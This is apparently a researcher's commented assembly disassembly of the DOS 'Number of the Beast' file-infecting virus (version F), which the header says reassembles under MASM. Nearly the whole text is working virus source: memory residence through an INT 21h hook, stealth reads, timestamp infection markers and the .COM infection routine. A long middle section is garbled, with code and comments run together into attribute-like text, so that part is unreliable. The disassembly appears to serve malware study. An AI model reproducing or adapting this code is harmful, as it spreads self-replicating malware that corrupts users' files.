

	name	V512F
	title	V512F - The 'Number of the Beast' Virus
	subttl	(Version F - a slight mutation of the original one)
	.radix	16

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        º
; º  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 º
; º									     º
; º		     The 'Number of the Beast' Virus, version F              º
; º		   Disassembled by Vesselin Bontchev, April 1990	     º
; º									     º
; º		     Copyright (c) Vesselin Bontchev 1989, 1990 	     º
; º									     º
; º	 This listing is only to be made available to virus researchers      º
; º		   or software writers on a need-to-know basis. 	     º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code,es:code

	org	100

start:
	mov	ah,30		; Get DOS version
	int	21

	mov	si,4		; Point DS at interrupt vectors
	mov	ds,si

	cmp	ah,1E		; Minor version >= 30?
	lds	ax,[si+8]	; Get INT 13h vector in DS:AX
	jb	low_ver 	; That's all if minor DOS version < 30="" mov="" ah,13="" ;="" get="" original="" int="" 13h="" vector="" in="" ds:dx="" int="" 2f="" push="" ds="" ;="" save="" it="" push="" dx="" int="" 2f="" ;="" call="" int="" 2f="" again="" to="" restore="" ds="" &="" dx="" pop="" ax="" ;="" restore="" original="" int="" 13h="" pop="" ds="" ;="" vector="" in="" ds:dx="" low_ver:="" mov="" di,0f8="" ;="" now="" int="" 13h="" vector="" is="" in="" ds:dx="" stosw="" ;="" save="" it="" at="" psp:0f8="" mov="" ax,ds="" stosw="" mov="" ds,si="" ;="" now="" get="" int="" 21h="" vector="" in="" ds:ax="" lds="" ax,[si+40]="" stosw="" ;="" and="" store="" it="" at="" psp:0fc="" cmp="" ax,(new_int_21="" -="" start)="" +="" 8="" ;="" virus="" in="" memory?="" mov="" ax,ds="" stosw="" ;="" by="" the="" way,="" now="" di="=" 100h="" push="" es="" ;="" now="" retf="" will="" jump="" to="" psp:100h,="" push="" di="" ;="" i.e.="" to="" start="" jne="" skip1="" ;="" virus="" not="" present.="" go="" to="" installation="" shl="" si,1="" ;="" second="" check="" for="" virus="" in="" memory.="" si="" :="8" mov="" cx,(endaddr-start)/2="" ;="" compare="" the="" virus="" code="" with="" ds:8="" rep="" cmpsw="" ;="" (100h="" words)="" skip1:="" push="" cs="" ;="" restore="" ds="" :="CS" pop="" ds="" je="" run="" ;="" virus="" found.="" run="" the="" original="" program="" ;="" virus="" not="" found="" in="" memory.="" install="" it="" there.="" the="" memory="" check="" is="" not="" ;="" quite="" correct.="" since="" the="" virus="" does="" not="" try="" to="" be="" the="" fist="" program="" ;="" which="" intercepts="" int="" 21h,="" it="" is="" possible="" that="" it="" is="" already="" present="" ;="" in="" memory,="" but="" another="" program="" (a="" tsr="" one)="" has="" changed="" the="" int="" 21h="" ;="" vector.="" this="" will="" cause="" the="" reloading="" of="" the="" virus="" and="" another="" buffer="" ;="" will="" "disapear".="" if="" there="" is="" no="" more="" buffers,="" the="" machine="" may="" hang.="" mov="" ah,52="" ;="" get="" list="" of="" lists="" in="" es:bx="" int="" 21="" push="" es="" ;="" save="" list's="" segment="" mov="" si,0f8="" ;="" prepare="" for="" move.="" offset="" of="" source="" address.="" sub="" di,di="" ;="" offset="" of="" destination="" address="" (0)="" les="" ax,es:[bx+12]="" ;="" point="" es:ax="" at="" first="" dos="" buffer="" ;="" point="" dx="" at="" next="" dos="" buffer.="" and="" what="" if="" there="" is="" no="" more="" buffers?="" mov="" dx,es:[di+2]="" ;="" copy="" the="" saved="" original="" interrupt="" vectors="" plus="" ;="" the="" virus="" body="" in="" the="" 1st="" dos="" buffer:="" mov="" cx,(endaddr-start+8)/2="" rep="" movsw="" mov="" ds,cx="" ;="" install="" es:121="" (new_int_21)="" mov="" di,16="" ;="" as="" new="" int="" 21h="" handler="" mov="" word="" ptr="" [di+21*4-16],(new_int_21="" -="" start)="" +="" 8="" mov="" [di+21*4-16+2],es="" pop="" ds="" ;="" point="" ds="" at="" the="" list="" of="" lists'="" segment="" ;="" "hide"="" the="" virus="" (now="" in="" the="" first="" dos="" buffer)="" by="" excluding="" this="" ;="" buffer="" from="" the="" dos="" buffer="" chain.="" to="" do="" so,="" just="" set="" the="" ;="" first="" buffer="" pointer="" to="" point="" at="" the="" next="" buffer="" of="" the="" chain.="" ;="" (dx="" already="" points="" at="" the="" next="" dos="" i/o="" buffer.)="" mov="" [bx+14],dx="" mov="" dx,cs="" ;="" dx="" :="current" psp="" mov="" ds,dx="" ;="" restore="" ds="=" cs="" mov="" bx,[di+2-16]="" ;="" point="" bx="" at="" high="" memory="" dec="" bh="" ;="" the="" second="" byte="" of="" the="" instruction="" above="" is="" 0cfh="=" iret="" new_int_24="" equ="" $-1="" mov="" es,bx="" ;="" point="" es="" at="" the="" last="" 4="" kbytes="" of="" memory="" ;="" if="" the="" current="" psp="" is="" less="" than="" the="" previous="" one,="" then="" ;="" ibmdos.com="" is="" just="" loading="" the="" command="" interpretter="" ;="" and="" the="" current="" psp="" belongs="" to="" the="" latter.="" cmp="" dx,[di]="" ;="" get="" command="" interpretter's="" full="" name="" in="" ds:16h="" mov="" ds,[di]="" mov="" dx,[di]="" dec="" dx="" mov="" ds,dx="" mov="" si,cx="" ;="" si="" :="0" mov="" dx,di="" ;="" dx="" :="16h" (di="=" 16h)="" mov="" cl,28="" ;="" copy="" name="" to="" higher="" memory="" (eventualy="" rep="" movsw="" ;="" destroys="" command.com's="" transient="" part)="" mov="" ds,bx="" jb="" boot="" ;="" run="" command="" interpretter="" at="" boot="" time="" int="" 20="" ;="" program="" terminate="" run:="" mov="" si,cx="" ;="" si="" :="0" mov="" ds,[si+2c]="" ;="" get="" environment="" address="" srch_lp:="" lodsw="" ;="" search="" the="" end="" of="" the="" environment="" dec="" si="" test="" ax,ax="" jnz="" srch_lp="" add="" si,3="" ;="" get="" program's="" name="" (argv="" [0])="" in="" dx="" mov="" dx,si="" boot:="" mov="" ah,3dh="" ;="" open="" file="" call="" dos_call="" mov="" dx,[di]="" ;="" dx="" :="file" size="" mov="" [di+4],dx="" ;="" position="" at="" the="" end="" of="" file="" add="" [di],cx="" ;="" add="" 512="" bytes="" to="" file="" size="" pop="" dx="" push="" dx="" ;="" dx="" :="100h" (offset="" start)="" push="" cs="" ;="" es="" :="DS" :="CS" pop="" ds="" push="" ds="" pop="" es="" push="" es="" mov="" al,50="" ;="" ah="" is="" 0="" (from="" dos_call)="" push="" ax="" ;="" now="" retf="" will="" jump="" to="" psp:50h.="" there="" are="" the="" instructions="" int="" 21h;="" retf="" there.="" ;="" thus,="" this="" will="" execute="" the="" next="" dos="" function="" call,="" then="" jump="" to="" psp:100h.="" mov="" ah,3f="" ;="" read="" from="" file="" handle="" retf="" ;="" (the="" first="" 512="" bytes="" into="" psp:100h)="" dos_call:="" int="" 21="" ;="" invoke="" dos="" function="" call="" jc="" dos_ret="" ;="" exit="" on="" error="" mov="" bx,ax="" ;="" save="" the="" file="" handle="" in="" bx="" point:="" push="" bx="" ;="" save="" bx="" mov="" ax,1220="" ;="" get="" system="" file="" table="" entry="" no.="" for="" int="" 2f="" ;="" file="" the="" handle="" in="" bx="" into="" es:di="" mov="" bl,es:[di]="" mov="" ax,1216="" ;="" get="" system="" fcb="" for="" file="" table="" entry="" int="" 2f="" ;="" no.="" in="" bx="" into="" es:di="" pop="" bx="" ;="" restore="" bx="" push="" es="" pop="" ds="" ;="" ds="" :="ES" add="" di,11="" ;="" point="" es:di="" &="" ds:di="" at="" file="" size="" mov="" cx,512d="" ;="" cx="" :="512" dos_ret:="" ret="" ;="" done.="" exit="" read:="" ;="" read="" function="" handler="" sti="" ;="" enable="" interrupts="" call="" point="" ;="" point="" es:di="" at="" file's="" internal="" fcb="" mov="" bp,cx="" ;="" bp="" :="512" mov="" si,[di+4]="" ;="" point="" si="" at="" file="" position="" pop="" cx="" ;="" restore="" cx="" &="" ds="" pop="" ds="" call="" do_read="" ;="" read="" from="" file="" handle="" jc="" int_21_xit1="" ;="" exit="" on="" error="" cmp="" si,bp="" ;="" is="" file="" position="">< 512?="" jnb="" int_21_xit1="" ;="" exit="" if="" not="" push="" ax="" ;="" save="" ax="" mov="" al,es:[di-4]="" ;="" get="" file="" time="" not="" al="" and="" al,1f="" ;="" seconds="=" 62?="" jnz="" int_21_xit="" ;="" exit="" if="" not="" add="" si,es:[di]="" ;="" compute="" offset="" at="" original="" code="" xchg="" si,es:[di+4]="" ;="" swap="" position="" (correct)="" add="" es:[di],bp="" ;="" correct="" file="" size="" (+512)="" call="" do_read="" ;="" read="" from="" file="" handle="" mov="" es:[di+4],si="" ;="" restore="" original="" position="" lahf="" ;="" save="" flags="" sub="" es:[di],bp="" ;="" restore="" original="" file="" size="" (-512)="" sahf="" ;="" restore="" flags="" int_21_xit:="" pop="" ax="" ;="" restore="" ax="" int_21_xit1:="" pop="" bp="" ;="" restore="" saved="" registers="" pop="" di="" pop="" si="" pop="" es="" retf="" 2="" ;="" return="" error="" code="" in="" flags="" do_read:="" mov="" ah,3f="" ;="" read="" from="" file="" using="" handle="" do_dos:="" pushf="" push="" cs="" ;="" prepare="" for="" iret="" call="" orig_21="" ret="" new_int_21:="" push="" es="" ;="" save="" registers="" used="" push="" si="" push="" di="" push="" bp="" push="" ds="" push="" cx="" cmp="" ah,3f="" ;="" is="" it="" a="" read="" function="" call?="" je="" read="" ;="" do="" it="" if="" so="" push="" ax="" ;="" save="" some="" more="" registers="" push="" bx="" push="" dx="" cmp="" ah,3e="" ;="" is="" it="" a="" close="" function="" call?="" je="" close="" ;="" do="" it="" if="" so="" cmp="" ax,4b00="" ;="" is="" it="" an="" exec="" function="" call?="" mov="" ah,3dh="" ;="" convert="" it="" to="" open="" if="" so="" je="" exec="" ;="" and="" execute="" it="" dos_xit:="" pop="" dx="" ;="" neither="" read,="" nor="" close,="" nor="" exec.="" pop="" bx="" ;="" restore="" registers="" and="" exit="" pop="" ax="" pop="" cx="" pop="" ds="" pop="" bp="" pop="" di="" pop="" si="" pop="" es="" orig_21:="" ;="" exit="" trough="" the="" original="" int="" 21h="" handler="" jmp="" dword="" ptr="" cs:[4]="" close:="" ;="" close="" function="" handler="" mov="" ah,45="" ;="" first="" duplicate="" the="" handle="" exec:="" ;="" exec="" function="" handler="" call="" dos_call="" jc="" dos_xit="" ;="" exit="" on="" error="" sub="" ax,ax="" ;="" ax="" :="0" mov="" [di+4],ax="" ;="" seek="" to="" file="" beginning="" mov="" byte="" ptr="" [di-0f],10b="" ;="" set="" access="" rights="" to="" writable="" cld="" ;="" clear="" direction="" flag="" mov="" ds,ax="" mov="" si,13*4="" ;="" save="" int="" 13h="" vector="" on="" stack="" lodsw="" push="" ax="" lodsw="" push="" ax="" push="" [si+24*4-(13*4+4)]="" ;="" save="" int="" 24h="" vector="" on="" stack="" push="" [si+24*4-(13*4+4)+2]="" lds="" dx,cs:[si-(13*4+4)]="" ;="" set="" int="" 13h="" to="" saved="" vector="" mov="" ax,2513="" ;="" set="" interrupt="" vector="" int="" 21="" push="" cs="" pop="" ds="" ;="" ds="" :="CS" mov="" dx,(new_int_24="" -="" start)="" +="" 8="" mov="" al,24="" ;="" set="" int="" 24h="" (critical="" error="" handler)="" to="" iret="" int="" 21="" ;="" set="" interrupt="" vector="" push="" es="" pop="" ds="" ;="" ds="" :="ES" mov="" al,[di-4]="" ;="" get="" file="" time="" and="" al,1f="" ;="" (the="" seconds="" more="" exactly)="" cmp="" al,1f="" ;="" file="" infected?="" je="" skip2="" ;="" skip="" the="" following="" code="" if="" so="" mov="" ax,[di+17]="" ;="" get="" file="" extension="" sub="" ax,'oc'="" ;="" '*.co?'="" file?="" jne="" go_close="" ;="" exit="" if="" not="" skip2:="" xor="" [di-4],al="" ;="" zero="" file="" seconds="" mov="" ax,[di]="" ;="" get="" file="" size="" cmp="" ax,cx="" ;="" is="" file="" size="">< 512?="" jb="" go_close="" ;="" don't="" infect="" if="" so="" add="" ax,cx="" jc="" go_close="" ;="" don't="" infect="" if="" file="" size="" +="" 512=""> 64 K

	test	byte ptr [di-0Dh],100b	; Test System attribute
	jnz	go_close	; Exit if ON

	lds	si,[di-0A]	; Get device driver pointer
	cmp	[si+4],ch	; See if at least 3 sectors/cluster (CH == 02h)
	jb	skip3
	dec	ax
	shr	ah,1		; AH := number of last sector after infection
	and	ah,[si+4]	; Get sector's number in the cluster
	jz	go_close	; Exit if does not fit

skip3:
	mov	ax,20
	mov	ds,ax		; Read 512 bytes using file handle
	sub	dx,dx		;  into 0000:0200h
	call	do_read 	; Do it

	mov	si,dx		; SI := 512 (DX == 512)
	push	cx		; Save CX (CX == 512)
v_srch:
	lodsb
	cmp	al,cs:[si+7]	; See if virus present in file
	jne	infect		; Infect file if not
	loop	v_srch
	pop	cx		; Restore CX
exit1:
	or	byte ptr es:[di-4],1F	; Set file time seconds to 62
exit2:
	or	byte ptr es:[di-0Bh],40 ; Set 'file modified' bit
go_close:
	mov	ah,3E		; Close file
	call	do_dos		; Execute the function

	or	byte ptr es:[di-0C],40	; ??? Flag ???

	pop	ds		; Restore INT 24h vector from stack
	pop	dx
	mov	ax,2524
	int	21		; Set interrupt vector

	pop	ds		; Restore INT 13h vector form stack
	pop	dx
	mov	al,13		; AH still equals 25h
	int	21		; Set interrupt vector
	jmp	dos_xit 	; Exit

infect:
	pop	cx
	mov	si,es:[di]	; Get file size
	mov	es:[di+4],si	; Seek at end of file

	mov	ah,40		; Write to file (the original bytes)
	int	21
	jc	exit2		; Exit on error

	mov	es:[di],si	; Restore original file size
	mov	es:[di+4],dx	; Position at file beginning

	push	cs
	pop	ds		; DS := CS

	mov	dl,8		; Write virus code (at DS:8) onto
	mov	ah,40		;  the file beginning
	int	21
	jmp	exit1		; And exit

cpright db	'666'           ; Author's signature (the devil's number)

endaddr equ	$

code	ends
	end	start

